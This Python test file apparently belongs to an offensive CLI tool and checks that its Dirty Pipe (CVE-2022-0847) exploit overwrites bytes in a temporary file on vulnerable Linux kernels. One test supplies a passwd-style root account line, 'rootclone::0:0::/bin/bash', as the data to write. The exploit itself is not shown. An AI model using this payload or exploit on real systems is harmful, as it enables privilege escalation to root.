"""test_dirtypipe — CVE-2022-0847 /tmp file overwrite (Linux CI, skipped
elsewhere). Never weaken a check to pass: on Linux this MUST overwrite."""
import os
import sys
import tempfile

import pytest

import quantum_cli as q

pytestmark = pytest.mark.skipif(
    not sys.platform.startswith("linux"),
    reason="Dirty Pipe splice attack is Linux-only")


def test_dirtypipe_overwrites_tmp_file():
    path = os.path.join(tempfile.gettempdir(), ".qcli_dp_test")
    with open(path, "wb") as fh:
        fh.write(b"A" * 4096)
    try:
        payload = b"QUANTUM-DP\n"
        res = q.exploit_dirtypipe(path, offset=16, data=payload)
        assert res.get("status") == "fired", res
        with open(path, "rb") as fh:
            fh.seek(16)
            got = fh.read(len(payload))
        if res.get("kernel_fixed"):
            # patched kernel (CI runners are 6.x): the splice mechanics run,
            # but the merge must NOT happen — the fix working is the assertion
            assert res.get("verified") is False
            assert got == b"A" * len(payload), got
        else:
            # vulnerable kernel (5.8..5.16.x unpatched): MUST overwrite
            assert res.get("verified") is True
            assert got == payload, got
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


def test_v3_dirtypipe_check_mode():
    path = os.path.join(tempfile.gettempdir(), ".qcli_dp_check")
    with open(path, "wb") as fh:
        fh.write(b"A" * 4096)
    try:
        res = q.v3_dirtypipe("127.0.0.1", {"file": path, "offset": 0,
                                          "data": b"rootclone::0:0::/bin/bash\n"})
        assert isinstance(res, dict)
        # on a fixed kernel or with restore=True the file stays intact
        with open(path, "rb") as fh:
            assert fh.read(1) == b"A"
    finally:
        try:
            os.remove(path)
        except OSError:
            pass
